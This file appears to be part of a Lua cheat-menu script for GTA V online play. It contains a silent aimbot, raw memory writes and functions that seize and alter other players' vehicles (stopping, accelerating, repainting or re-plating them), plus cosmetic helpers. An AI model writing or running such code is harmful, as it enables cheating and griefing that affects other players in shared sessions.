    local offsets = {0x10D8, 0x70, 0x60, 0x58}
    local addr = entities.handle_to_pointer(PLAYER.PLAYER_PED_ID())
    for i = 1, (#offsets - 1) do
        -- make sure not to read from/write to a null pointer
        if addr == 0 then
            -- got a null pointer at some point
            return -1.0
        end
        addr = memory.read_long(addr + offsets[i])
    end
    addr = addr + offsets[#offsets]
    
    if addr == 0 then
        return -1.0
    else
        memory.write_float(addr, value)
        --memory.read_float(addr)
    end
end


function start_silent_aimbot()
    saimbot_thread = util.create_thread(function (thr)
    while true do
        if not silent_aimbot then
            util.stop_thread()
        end
        local target = get_aimbot_target()
        if target ~= 0 then
            local t_pos = PED.GET_PED_BONE_COORDS(target, 31086, 0.01, 0, 0)
            local t_pos2 = PED.GET_PED_BONE_COORDS(target, 31086, -0.01, 0, 0.00)
            -- debug shit, ignore
            if false then
                GRAPHICS.DRAW_MARKER(0, t_pos['x'], t_pos['y'], t_pos['z'], 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.1, 0.1, 0.1, 255, 0, 255, 100, false, true, 2, false, 0, 0, false)
                GRAPHICS.DRAW_MARKER(0, t_pos2['x'], t_pos2['y'], t_pos2['z'], 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.1, 0.1, 0.1, 255, 0, 255, 100, false, true, 2, false, 0, 0, false)
            end
            GRAPHICS.DRAW_MARKER(0, t_pos['x'], t_pos['y'], t_pos['z']+2, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, 1, 1, 255, 0, 255, 100, false, true, 2, false, 0, 0, false)
            if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
                local wep = WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.PLAYER_PED_ID())
                local dmg = WEAPON.GET_WEAPON_DAMAGE(wep, 0)
                if satarget_damageo then
                    dmg = sa_odmg
                end
                local veh = PED.GET_VEHICLE_PED_IS_IN(target, false)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(t_pos['x'], t_pos['y'], t_pos['z'], t_pos2['x'], t_pos2['y'], t_pos2['z'], dmg, true, wep, PLAYER.PLAYER_PED_ID(), true, false, 10000, veh)
            end
        end
        util.yield()
    end
end)
end

VEH_MISSILE_SPEED = 10000

MISL_AIM = false
missile_settings = {
    radius = 300,
    speed = 100,
    los = true,
    cam = false,
    ptfx = true,
    ptfx_scale = 1,
    air_target = false,
    multitarget = false,
    multiped = false
}
missile_particles = {
    name = "exp_grd_rpg_lod",
    dictionary = "core"
}

--Later: block rockets (spawn walls when detecting they are in range)

ATTACH_CAM_TO_ENTITY_WITH_FIXED_DIRECTION = function (--[[Cam (int)]] cam, --[[Entity (int)]] entity, --[[float]] xRot, --[[float]] yRot, --[[float]] zRot, --[[float]] xOffset, --[[float]] yOffset, --[[float]] zOffset, --[[BOOL (bool)]] isRelative)
    native_invoker.begin_call()
    native_invoker.push_arg_int(cam)
    native_invoker.push_arg_int(entity)
    native_invoker.push_arg_float(xRot); native_invoker.push_arg_float(yRot); native_invoker.push_arg_float(zRot)
    native_invoker.push_arg_float(xOffset); native_invoker.push_arg_float(yOffset); native_invoker.push_arg_float(zOffset)
    native_invoker.push_arg_bool(isRelative)
    native_invoker.end_call("202A5ED9CE01D6E7")
end

--https://github.com/Sainan/gta-v-joaat-hash-db/blob/senpai/out/objects-hex.csv

Rocket_Hashes = {
    {"rpg", util.joaat("w_lr_rpg_rocket")},
    {"homingrpg", util.joaat("w_lr_homing_rocket")},
    {"oppressor2", util.joaat("w_ex_vehiclemissile_3")},
    {"b11barrage", util.joaat("w_smug_airmissile_01b")},
    {"b11regular", util.joaat("w_battle_airmissile_01")},
    {"chernobog", util.joaat("w_ex_vehiclemissile_4")},
    {"akula", util.joaat("w_smug_airmissile_02")},
    {"grenadelauncher", util.joaat("w_lr_40mm")}, --grenade launcher lmfao
    {"compactemplauncher", util.joaat("w_lr_ml_40mm")}, --compact emp launhcer lmao
    {"teargas", util.joaat("w_ex_grenadesmoke")} --tear gas grenade lmfao
}

Chosen_Rocket_Hash = Rocket_Hashes[1][2] --default is the regular RPG
MISSILE_ENTITY_TABLE = {}

MISL_AIR = false

ORB_Sneaky = false

sa_fov = 180

sa_odmg = 100

CAR_S_sneaky = false
CAR_S_BLACKLIST = {}


LegitRapidFire = false
LegitRapidMS = 100
-----------------

function Disbet(pid)
    local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
    local play = ENTITY.GET_ENTITY_COORDS(players.user_ped(), true)
    local disbet = SYSTEM.VDIST2(play.x, play.y, play.z, tar1.x, tar1.y, tar1.z)
    return disbet
end

function Specon(pid)
    menu.trigger_commands("spectate".. players.get_name(pid).. ' on')
    util.yield(3000)
end

function Specoff(pid)
    menu.trigger_commands("spectate".. players.get_name(pid).. ' off')
end


function GetPlayVeh(pid, opt)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    if not players.exists(pid) then
        util.stop_thread()
    end
    local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method"))
    if set.alert then
        util.toast('获得对车辆的控制')
    end
    if Disbet(pid) > 750000  then
        Specon(pid)
    if PED.IS_PED_IN_ANY_VEHICLE(pedm, true) then
        opt()
        if not spec then
            Specoff(pid)
        end
        return
    else
        if set.alert then
        util.toast('玩家不在车内')
        end
        Specoff(pid)
    end
    elseif Disbet(pid) < 750000 then
        if PED.IS_PED_IN_ANY_VEHICLE(pedm, true) then
            opt()
            if not spec then
                Specoff(pid)
            end
        return
        end
    else
        if set.alert then
        util.toast('玩家不在车内')
        end
    end
end

function Rolladown(pid)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method"))
    GetControl(pedm, spec, pid)
    VEHICLE.ROLL_DOWN_WINDOWS(vmod)
end

function Rollaup(pid)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method"))
    GetControl(pedm, spec, pid)
    for i = 0, 7 do
        VEHICLE.ROLL_UP_WINDOW(vmod, i)
    end
end

function Rolldindivid(pid, win)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method"))
    GetControl(pedm, spec, pid)
    VEHICLE.ROLL_DOWN_WINDOW(vmod, win)
end

function Rolluindivid(pid, win)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method"))
    GetControl(pedm, spec, pid)
    VEHICLE.ROLL_UP_WINDOW(vmod, win)
end

function Getmodcou(pid, mod)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    if PED.IS_PED_IN_ANY_VEHICLE(pedm) ==true then
        local max = VEHICLE.GET_NUM_VEHICLE_MODS(vmod, mod)
        return max
    end
end

function Changemod(pid, modtype, mod)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method"))
    if not players.exists(pid) then
        util.stop_thread()
    end
    if PED.IS_PED_IN_ANY_VEHICLE(pedm) ==true then
        local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
            GetControl(vmod, spec, pid)
        VEHICLE.GET_NUM_MOD_KITS(vmod)
        VEHICLE.GET_VEHICLE_MOD_KIT(vmod)
        VEHICLE.SET_VEHICLE_MOD_KIT(vmod, 0)
        VEHICLE.SET_VEHICLE_MOD(vmod, modtype, mod, false)
    end
end

function RGBNeonKit(pedm)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    for i = 0, 3 do
        VEHICLE.SET_VEHICLE_NEON_ENABLED(vmod, i, true)
    end
end

function Changewheel(pid, wtype, wheel)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
    local vhash = ENTITY.GET_ENTITY_MODEL(vmod)
    local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method"))
    if not players.exists(pid) then
        util.stop_thread()
    end
        GetControl(vmod, spec, pid)
    if VEHICLE.IS_THIS_MODEL_A_BIKE(vhash) then
        VEHICLE.SET_VEHICLE_WHEEL_TYPE(vmod, wtype)
        VEHICLE.SET_VEHICLE_MOD(vmod, 23, wheel)
        VEHICLE.SET_VEHICLE_MOD(vmod, 24, wheel)
    else
        VEHICLE.SET_VEHICLE_WHEEL_TYPE(vmod, wtype)
        VEHICLE.SET_VEHICLE_MOD(vmod, 23, wheel)
    end
end


function Changehead(pid, color)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
    local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method"))
    if not players.exists(pid) then
        util.stop_thread()
    end
        GetControl(vmod, spec, pid)
    VEHICLE.TOGGLE_VEHICLE_MOD(vmod, 22, true)
    VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vmod, color)
end

function Changeneon(pid, color)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
    local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method"))
    if not players.exists(pid) then
        util.stop_thread()
    end
        GetControl(vmod, spec, pid)
    RGBNeonKit(pedm)
    VEHICLE.SET_VEHICLE_NEON_INDEX_COLOUR(vmod, color)

end

function Changetint(pid, tint)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
    local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method"))
    if not players.exists(pid) then
        util.stop_thread()
    end
        GetControl(vmod, spec, pid)
    VEHICLE.SET_VEHICLE_FIXED(vmod)
    VEHICLE.SET_VEHICLE_WINDOW_TINT(vmod, tint)
end


function Changecolor(pid, color)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
    local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method"))
    if not players.exists(pid) then
        util.stop_thread()
    end
        GetControl(vmod, spec, pid)
    VEHICLE.SET_VEHICLE_FIXED(vmod)
    VEHICLE.SET_VEHICLE_COLOURS(vmod, color.prim, color.sec)
end


function Changewhepercolor(pid, color)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
    local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method"))
    if not players.exists(pid) then
        util.stop_thread()
    end
        GetControl(vmod, spec, pid)
    VEHICLE.SET_VEHICLE_FIXED(vmod)
    VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vmod, color.per, color.whe)
end

function Changeintcolor(pid, color)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
    local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method"))
    if not players.exists(pid) then
        util.stop_thread()
    end
        GetControl(vmod, spec, pid)
    VEHICLE.SET_VEHICLE_FIXED(vmod)
    VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(vmod, color)
end

function Changedashcolor(pid, color)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
    local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method"))
    if not players.exists(pid) then
        util.stop_thread()
    end
        GetControl(vmod, spec, pid)
    VEHICLE.SET_VEHICLE_FIXED(vmod)
    VEHICLE.SET_VEHICLE_EXTRA_COLOUR_6(vmod, color)
end

function Changemod(pid, modtype, mod)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method"))
    if not players.exists(pid) then
        util.stop_thread()
    end
    if PED.IS_PED_IN_ANY_VEHICLE(pedm) ==true then
        local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
            GetControl(vmod, spec, pid)
        VEHICLE.GET_NUM_MOD_KITS(vmod)
        VEHICLE.GET_VEHICLE_MOD_KIT(vmod)
        VEHICLE.SET_VEHICLE_MOD_KIT(vmod, 0)
        VEHICLE.SET_VEHICLE_MOD(vmod, modtype, mod, false)
    end
end

function Getmodcou(pid, mod)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    if PED.IS_PED_IN_ANY_VEHICLE(pedm) ==true then
        local max = VEHICLE.GET_NUM_VEHICLE_MODS(vmod, mod)
        return max
    end
end

function Maxoutcar(pid)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method"))
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    GetControl(vmod, spec, pid)
     Vmod(vmod, "URWLCUM")
     VEHICLE.SET_VEHICLE_WHEEL_TYPE(vmod, math.random(0, 7))
     VEHICLE.SET_VEHICLE_MOD(vmod, 23, math.random(-1, 50))
     ENTITY.SET_ENTITY_INVINCIBLE(vmod, true)
     if set.alert then
     util.toast('车辆极限')
     end
end

function Platechange(cusplate, pid)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method"))
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    GetControl(vmod, spec, pid)
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vmod, cusplate)
    if set.alert then
    util.toast('车牌改了')
    end
end

function Fixveh(pid)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method"))
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    GetControl(vmod, spec, pid)
    VEHICLE.SET_VEHICLE_FIXED(vmod)
    if set.alert then
    util.toast('修车')
    end
end

function Accelveh( speed, pid)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method"))
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    GetControl(vmod, spec, pid)
    VEHICLE.SET_VEHICLE_FORWARD_SPEED(vmod, speed)
    if set.alert then
    util.toast('车辆加速')
    end
end

function Stopveh(pid)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method"))
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    GetControl(vmod, spec, pid)
    VEHICLE.SET_VEHICLE_FORWARD_SPEED(vmod, -1000)
    ENTITY.SET_ENTITY_VELOCITY(vmod, 0, 0, 0)
    VEHICLE.SET_VEHICLE_ENGINE_ON(vmod, false, false, false)
    if set.alert then
    util.toast('减速车辆')
    end
end

function Rpaint(pid)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method"))
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    GetControl(vmod, spec, pid)
    VEHICLE.SET_VEHICLE_FIXED(vmod)
    VEHICLE.SET_VEHICLE_COLOURS(vmod, math.random(0, 160), math.random(0, 160))
    if set.alert then
    util.toast('涂装车辆')
    end
end


local minimum<const> = memory.alloc()
local maximum<const> = memory.alloc()
function getDimensions(entity)
    MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(entity), minimum, maximum)
    local minimum_vec<const> = v3.new(minimum)
    local maximum_vec<const> = v3.new(maximum)
    local dimensions<const> = {
        x = maximum_vec.y - minimum_vec.y,
        y = maximum_vec.x - minimum_vec.x,
        z = maximum_vec.z - minimum_vec.z
    }
    return dimensions
end

local colorR, colorG, colorB = memory.alloc(1), memory.alloc(1), memory.alloc(1)
---@param vehicle Vehicle
---@param cloneVehicle Vehicle
function copyVehicleData(vehicle, cloneVehicle)
    VEHICLE.SET_VEHICLE_MOD_KIT(cloneVehicle, 0)
    for i = 17, 22 do
        VEHICLE.TOGGLE_VEHICLE_MOD(cloneVehicle, i, VEHICLE.IS_TOGGLE_MOD_ON(vehicle, i))
    end

    for i = 0, 49 do
        local modValue<const> = VEHICLE.GET_VEHICLE_MOD(vehicle, i)
        VEHICLE.SET_VEHICLE_MOD(cloneVehicle, i, modValue)
    end

    if VEHICLE.GET_IS_VEHICLE_PRIMARY_COLOUR_CUSTOM(vehicle) then
        VEHICLE.GET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, colorR, colorG, colorB)
        VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))
    else
        VEHICLE.GET_VEHICLE_MOD_COLOR_1(vehicle, colorR, colorG, colorB)
        VEHICLE.SET_VEHICLE_MOD_COLOR_1(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))
    end

    if VEHICLE.GET_IS_VEHICLE_SECONDARY_COLOUR_CUSTOM(vehicle) then
        VEHICLE.GET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, colorR, colorG, colorB)
        VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))
    else
        VEHICLE.GET_VEHICLE_MOD_COLOR_2(vehicle, colorR, colorG)
        VEHICLE.SET_VEHICLE_MOD_COLOR_2(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG))
    end

    VEHICLE.GET_VEHICLE_COLOURS(vehicle, colorR, colorG)
    VEHICLE.SET_VEHICLE_COLOURS(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG))

    VEHICLE.GET_VEHICLE_EXTRA_COLOURS(vehicle, colorR, colorG)
    VEHICLE.SET_VEHICLE_EXTRA_COLOURS(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG))

    VEHICLE.GET_VEHICLE_EXTRA_COLOUR_5(vehicle, colorR) -- interior
    VEHICLE.GET_VEHICLE_EXTRA_COLOUR_6(vehicle, colorG)
    VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(cloneVehicle, memory.read_ubyte(colorR)) -- dashboard
    VEHICLE.SET_VEHICLE_EXTRA_COLOUR_6(cloneVehicle, memory.read_ubyte(colorG)) -- interior

    VEHICLE.GET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, colorR, colorG, colorB)
    VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))

    VEHICLE.GET_VEHICLE_NEON_COLOUR(vehicle, colorR, colorG, colorB)
    VEHICLE.SET_VEHICLE_NEON_COLOUR(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))

    for i = 0, 3 do
        VEHICLE.SET_VEHICLE_NEON_ENABLED(cloneVehicle, i, VEHICLE.GET_VEHICLE_NEON_ENABLED(vehicle, i))
    end

    local windowTint<const> = VEHICLE.GET_VEHICLE_WINDOW_TINT(vehicle)
    VEHICLE.SET_VEHICLE_WINDOW_TINT(cloneVehicle, windowTint)

    local lightsColor<const> = VEHICLE.GET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vehicle)
    VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(cloneVehicle, lightsColor)

    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(cloneVehicle, VEHICLE.GET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle))
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(cloneVehicle, VEHICLE.GET_VEHICLE_NUMBER_PLATE_TEXT(vehicle))

    VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(cloneVehicle, VEHICLE.GET_VEHICLE_TYRES_CAN_BURST(vehicle))
    VEHICLE.SET_VEHICLE_DIRT_LEVEL(cloneVehicle, VEHICLE.GET_VEHICLE_DIRT_LEVEL(vehicle))

    for i = 1, 14 do
        VEHICLE.SET_VEHICLE_EXTRA(cloneVehicle, i, not VEHICLE.IS_VEHICLE_EXTRA_TURNED_ON(vehicle, i))
    end

    local roofState<const> = VEHICLE.GET_CONVERTIBLE_ROOF_STATE(vehicle)
    if roofState == 1 or roofState == 2 then
        VEHICLE.LOWER_CONVERTIBLE_ROOF(cloneVehicle, true)
    end

    VEHICLE.SET_VEHICLE_ENGINE_ON(cloneVehicle, VEHICLE.GET_IS_VEHICLE_ENGINE_RUNNING(vehicle), true, true)
end

function clone(vehicle)
    local vehicleHeading<const> = ENTITY.GET_ENTITY_HEADING(vehicle)
    local vehicleHash<const> = ENTITY.GET_ENTITY_MODEL(vehicle)
    local coords = ENTITY.GET_ENTITY_COORDS(vehicle)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(vehicle)
    local rot = v3.toDir(ENTITY.GET_ENTITY_ROTATION(vehicle, 2))
    v3.mul(rot, -getDimensions(vehicle).x - 2)
    v3.add(coords, rot)
    local cloneVehicle<const> = entities.create_vehicle(vehicleHash, coords, vehicleHeading)
    copyVehicleData(vehicle, cloneVehicle)
    return cloneVehicle
end


function getgroupsize(group)
    local unkPtr, sizePtr = memory.alloc(1), memory.alloc(1)
    PED.GET_GROUP_SIZE(group, unkPtr, sizePtr)
    return memory.read_int(sizePtr)
end

mygroup = PLAYER.GET_PLAYER_GROUP(players.user())

dogs = table.freeze({
    "Rottweiler",
    "Husky",
    "Poodle",
    "Pug",
    "Retriever",
    "Westy",
    "Shepherd",
    "Cat_01",
})

doganimations = {
    "WORLD_DOG_SITTING_ROTTWEILER",
    "WORLD_DOG_SITTING_RETRIEVER",
    "WORLD_DOG_SITTING_SHEPHERD",
    "WORLD_DOG_SITTING_SMALL",
}

activedogs = {}

function GenerateNametagOnPed(ped, nametag)
    util.create_thread(function()
        while ENTITY.DOES_ENTITY_EXIST(ped) do
            local headpos = PED.GET_PED_BONE_COORDS(ped, 0x796e, 0,0,0)
            GRAPHICS.SET_DRAW_ORIGIN(headpos.x, headpos.y, headpos.z+0.4, 0)

            HUD.SET_TEXT_COLOUR(200,200,200,220)
            HUD.SET_TEXT_SCALE(1, 0.5)
            HUD.SET_TEXT_CENTRE(true)
            HUD.SET_TEXT_FONT(4)
            HUD.SET_TEXT_OUTLINE()

            HUD.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("STRING")
            HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(nametag)
            HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0,0,0)
            GRAPHICS.CLEAR_DRAW_ORIGIN()
            util.yield()
        end
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0,0,0)
        GRAPHICS.CLEAR_DRAW_ORIGIN()
    end)
end

function removeValues(t, removeT)
    for _, r in ipairs(removeT) do
        for i, v in ipairs(t) do
            if v == r then
                table.remove(t, i)
            end
        end
    end
end

function first_to_upper(str)
    return (str:gsub("^%l", string.upper))
end


function get_model_size(hash)
    local minptr = memory.alloc(24)
    local maxptr = memory.alloc(24)
    local min = {}
    local max = {}
    MISC.GET_MODEL_DIMENSIONS(hash, minptr, maxptr)
    min.x, min.y, min.z = v3.get(minptr)
    max.x, max.y, max.z = v3.get(maxptr)
    local size = {}
    size.x = max.x - min.x
    size.y = max.y - min.y
    size.z = max.z - min.z
    size['max'] = math.max(size.x, size.y, size.z)
    return size
end


local ent_types = {"无", "Ped", "车辆", "物体"}
function get_aim_info()
    local outptr = memory.alloc(4)
    local success = PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(players.user(), outptr)
    local info = {}
    if success then
        local ent = memory.read_int(outptr)
        if not ENTITY.DOES_ENTITY_EXIST(ent) then
            info["ent"] = 0
        else
            info["ent"] = ent
        end
        if ENTITY.GET_ENTITY_TYPE(ent) == 1 then
            local veh = PED.GET_VEHICLE_PED_IS_IN(ent, false)
            if veh ~= 0 then
                if VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1) then
                    ent = veh
                    info['ent'] = ent
                end
            end
        end
        info["hash"] = ENTITY.GET_ENTITY_MODEL(ent)
        info["health"] = ENTITY.GET_ENTITY_HEALTH(ent)
        info["type"] = ent_types[ENTITY.GET_ENTITY_TYPE(ent)+1]
        info["speed"] = math.floor(ENTITY.GET_ENTITY_SPEED(ent))
    else
        info['ent'] = 0
    end
    return info
end

function to_rgb(r, g, b, a)
    local color = {}
    color.r = r
    color.g = g
    color.b = b
    color.a = a
    return color
end

function raycast_gameplay_cam_gun(flag, distance)
    local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = v3.toDir(cam_rot)
    local destination = 
    { 
        x = cam_pos.x + direction.x * distance, 
        y = cam_pos.y + direction.y * distance, 
        z = cam_pos.z + direction.z * distance 
    }
    SHAPETEST.GET_SHAPE_TEST_RESULT(
        SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
            cam_pos.x, 
            cam_pos.y, 
            cam_pos.z, 
            destination.x, 
            destination.y, 
            destination.z, 
            flag, 
            players.user_ped(), 
            1
        ), ptr1, ptr2, ptr3, ptr4)
    local p1 = memory.read_int(ptr1)
    local p2 = memory.read_vector3(ptr2)
    local p3 = memory.read_vector3(ptr3)
    local p4 = memory.read_int(ptr4)
    return {p1, p2, p3, p4}
end

---
protected_area_radius = 100
protected_areas = {}
protected_area_allow_friends = true
protected_areas_on = false






local function alert_thuds()
    util.create_thread(function()
        AUDIO.PLAY_SOUND_FRONTEND(-1, "Hit_In", "PLAYER_SWITCH_CUSTOM_SOUNDSET")
        util.yield(500)
        AUDIO.PLAY_SOUND_FRONTEND(-1, "Hit_In", "PLAYER_SWITCH_CUSTOM_SOUNDSET")
        util.yield(500)
        AUDIO.PLAY_SOUND_FRONTEND(-1, "Hit_In", "PLAYER_SWITCH_CUSTOM_SOUNDSET")
    end)
end

fake_alert_delay = 0
function show_custom_alert_until_enter(l1)
    util.yield(fake_alert_delay)
    alert_thuds()
    poptime = os.time()
    while true do
        if PAD.IS_CONTROL_JUST_RELEASED(18, 18) then
            if os.time() - poptime > 0.1 then
                break
            end
        end
        native_invoker.begin_call()
        native_invoker.push_arg_string("ALERT")
        native_invoker.push_arg_string("JL_INVITE_ND")
        native_invoker.push_arg_int(2)
        native_invoker.push_arg_string("")
        native_invoker.push_arg_bool(true)
        native_invoker.push_arg_int(-1)
        native_invoker.push_arg_int(-1)
        -- line here
        native_invoker.push_arg_string(l1)
        -- optional second line here
        native_invoker.push_arg_int(0)
        native_invoker.push_arg_bool(true)
        native_invoker.push_arg_int(0)
        native_invoker.end_call("701919482C74B5AB")
        util.yield()
    end
end

local resx, resy = directx.get_client_size()
aspectratio = resx/resy

guix = 0
guiy = 0

colour_map =
{
    titlebar = {r = 1, g = 0, b = 1, a = 1},
    background = {r = 0, g = 0, b = 0, a = 77/255},
    healthbar = {r = 114/255, g = 204/255, b = 114/255, a = 150/255},
    armourbar = {r = 70/255, g = 136/255, b = 171/255, a = 150/255},
    blip = {r = 1, g = 1, b = 1, a = 1},
    name = {r = 1, g = 1, b = 1, a = 1},
    label = {r = 1, g = 1, b = 1, a = 1},
    info = {r = 1, g = 1, b = 1, a = 1},
    border = {r = 1, g = 0, b = 1, a = 1}
}

nameh = 0.022
padding = 0.008
spacing = 0.003
textw = 0.16

--settings text sizing & spacing
namesize = 0.52
textsize = 0.41
linespacing = 0.0032

--settings border
borderwidth = 0

--settings blur
blurstrength = 4
blur = {}
for i = 1, 8 do blur[i] = directx.blurrect_new() end

--map textures
textures =
{
    map = directx.create_texture(filesystem.scripts_dir() .. "/baibaiScript/" .. "/GTAmap/" .. 'GTA Map.png'),
    blip = directx.create_texture(filesystem.scripts_dir() .. "/baibaiScript/" .. "/GTAmap/" .. 'defaultblip.png')
}


--draw functions
